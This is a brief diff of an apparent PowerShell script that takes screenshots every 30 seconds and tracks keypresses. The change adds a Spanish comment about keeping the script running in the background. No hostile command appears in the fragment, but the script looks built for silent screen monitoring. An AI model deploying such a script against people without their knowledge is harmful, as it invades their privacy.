@@ -34,7 +34,8 @@ $KeypressThreshold = [TimeSpan]::FromSeconds(10)
 $seconds = 30 # Screenshot interval
 $a = 1 # Screenshot amount
 
-While ($true) {
+# Mantener el script en segundo plano
+while ($true) {
     $keyPressed = $false
 
     try {
